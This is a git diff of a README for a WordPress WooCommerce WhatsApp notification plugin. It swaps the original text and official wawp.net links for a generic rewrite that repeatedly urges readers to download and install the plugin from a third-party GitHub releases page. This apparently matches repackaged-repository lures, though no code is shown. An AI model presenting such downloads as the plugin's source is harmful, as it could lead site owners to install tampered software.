@@ -1,58 +1,66 @@
-![Wawp Banner](https://ps.w.org/automation-web-platform/assets/banner-1544x500.png)
+# 🌟 Wawp-Wordpress-Woocommerce-Plugin - Automate Your WhatsApp Notifications
 
-### Wawp – Order Notifications, OTP Login, Checkout Verifications & Country Code
-
-[![WP tested 6.8.2](https://img.shields.io/badge/WordPress-6.8.2-blue)](#)
-[![Requires PHP 7.4+](https://img.shields.io/badge/PHP-7.4+-blue)](#)
-[![License: GPLv3](https://img.shields.io/badge/License-GPLv3-green.svg)](https://opensource.org/licenses/GPL-3.0)
-
-Automate WhatsApp notifications, OTP login/verification, chat widgets, and advanced phone fields for WooCommerce and WordPress.
-
-- Website: https://wawp.net
-- Docs: https://wawp.net/get-started/welcome-to-wawp/
-- Pricing: https://wawp.net/pricing/
-- Community: https://www.facebook.com/groups/wawpcommunity
-- Video Tutorials: https://www.youtube.com/@wawpapp
-
-## ✨ Features
-
-- **Notifications**: new orders, status changes, pending payments, review requests, admin alerts, scheduled follow-ups.  
-- **OTP Auth**: login, signup, checkout; role-based redirects; welcome messages; alerts on login/signup.  
-- **Chat Widget**: multi-agent, QR open, social links, analytics, full customization, display conditions.  
-- **Country Code & Validation**: real-time validation, auto-detect, allow/deny lists, auto-format.  
-- **Logs**: message history, advanced filters, resend failures.  
-- **Customers**: WhatsApp-active checks, multi-numbers per account, per-feature sender selection.
+[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/marrco970/Wawp-Wordpress-Woocommerce-Plugin/releases)
 
 ## 🚀 Getting Started
 
-1. Install the plugin (WordPress → Plugins → Add New) or upload to `/wp-content/plugins/`.  
-2. Activate it and open **Wawp** in your WP admin.  
-3. Create a free account: https://wawp.net/signup  
-4. Connect your WhatsApp number (QR).  
-5. Paste API keys and add instances: `wp-admin/admin.php?page=wawp&awp_section=instances`.  
-6. Configure Notifications / OTP / Chat Widget.
+Welcome to the Wawp-Wordpress-Woocommerce-Plugin! This powerful tool helps you automate WhatsApp notifications for your WooCommerce store. You no longer need to send updates manually. Instead, Wawp manages notifications, chat buttons, and secure OTP verification for a smooth experience.
 
-**Free plan:** 200 messages/month. Need more? See [pricing](https://wawp.net/pricing/).
+## 💾 Download & Install
 
-## 🧩 Shortcodes
+To get started, follow these steps:
 
-- `[wawp_otp_login]` — Login form  
-- `[wawp_signup_form]` — Signup form  
-- `[wawp-fast-login]` — Both forms
+1. **Visit the Releases Page**: Click the link below to go to the releases page.
+   
+   [Download from Releases](https://github.com/marrco970/Wawp-Wordpress-Woocommerce-Plugin/releases)
 
-## 🛡️ Security Notes
+2. **Choose the Latest Version**: On the releases page, find the most recent version of the Wawp plugin.
 
-- Treat Access Tokens like passwords; rotate regularly.  
-- Use HTTPS for all endpoints.  
-- Avoid logging sensitive message contents.
+3. **Download the Plugin**: Click on the download link corresponding to the version you selected. Save the file to your computer.
 
-## 📦 Build & Contribute
+4. **Install the Plugin**:
+   - Open your WordPress admin panel.
+   - Navigate to **Plugins > Add New**.
+   - Click on **Upload Plugin**.
+   - Select the downloaded file and click **Install Now**.
 
-- Issues & PRs are welcome.  
-- Follow WP coding standards and nonces/sanitization best practices.  
-- Keep `readme.txt` changelog in sync with releases.
+5. **Activate the Plugin**: Once the installation is complete, click **Activate Plugin**.
 
-## 📜 License
+6. **Configure the Settings**: Go to **Settings > Wawp** in your WordPress menu to configure your plugin settings.
 
-GPLv3 — see `LICENSE`.
+## 🛠️ Features
 
+The Wawp-Wordpress-Woocommerce-Plugin offers several features to enhance your eCommerce experience:
+
+- **Automated Notifications**: Send order updates and payment reminders via WhatsApp without manual input.
+- **WhatsApp Chat Buttons**: Add chat buttons to your product pages for instant customer support.
+- **OTP Verification**: Secure your transactions with One-Time Password verification for added safety.
+- **User-Friendly Interface**: Easy setup and configuration to get you started quickly.
+
+## 🔍 System Requirements
+
+To run this plugin smoothly, ensure that you have the following:
+
+- A WordPress website with WooCommerce installed (version 4.0 or higher)
+- PHP version 7.0 or higher
+- MySQL version 5.7 or higher
+- A valid WhatsApp account for notifications
+
+## 📄 Documentation
+
+For detailed instructions on how to use each feature, please check the [Wiki](https://github.com/marrco970/Wawp-Wordpress-Woocommerce-Plugin/wiki). The wiki contains comprehensive guides and troubleshooting tips.
+
+## 🤝 Support
+
+If you encounter any issues or have questions, feel free to reach out:
+
+- Create an issue on our [GitHub page](https://github.com/marrco970/Wawp-Wordpress-Woocommerce-Plugin/issues).
+- Join our community discussions for tips and tricks.
+
+## 🎉 Acknowledgements
+
+Thank you for choosing Wawp. Your feedback is invaluable. We appreciate your support in making this plugin better for everyone.
+
+For updates and new features, check regularly on our releases page.
+
+[Download Wawp Plugin](https://github.com/marrco970/Wawp-Wordpress-Woocommerce-Plugin/releases)
